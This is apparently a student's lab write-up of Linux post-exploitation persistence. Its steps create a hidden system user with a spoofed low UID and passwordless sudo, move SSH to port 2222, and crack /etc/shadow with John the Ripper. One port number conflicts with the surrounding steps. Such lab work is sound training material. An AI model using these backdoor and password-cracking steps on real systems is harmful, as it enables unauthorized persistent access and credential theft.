# Advanced Bash - Owning the System

Step 1: Shadow People
- 1. Create a secret user named sysd. Make sure this user doesn't have a home folder created:
  - sudo useradd --system --no-create-home sysd

![](Linux/Images/AB-1-create-user.png)

- 2. Give your secret user a password:
  - Sudo passwd sysd



- 3. Give your secret user a system UID < 1000
    - sudo usermod -u 997 sysd




- 4. Give your secret user the same GID:
    - sudo groupmod -g 997 sysd


- 5. Give your secret user full sudo access without the need for a password:
    - sudo visudo


- 6. Test that sudo access works without your password:
    - su sysd
    - Passw0rd










- Step 2: Smooth Sailing
  - 1. Edit the sshd_config file:
    - sudo nano /etc/ssh/sshd_config




- Step 3: Testing Your Configuration Update
  - 1. Restart the SSH service:
    - systemctl restart ssh

 - 2. Exit the root account
    - exit   (see bottom of the screenshot to see “exit”)




  - 3. SSH to the target machine using your sysd account and port 2222:
    - ssh sysd@192.168.1.23 -p 2222




  - 4. Use sudo to switch to the root user:
    - sudo su root




- Step 4: Crack All the Passwords
  - 1. SSH back to the system using your sysd account and port 2222:
    - ssh sysd@192.168.1.23 -p 22


 - 2. Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:
    - sudo su root
    - john /etc/shadow
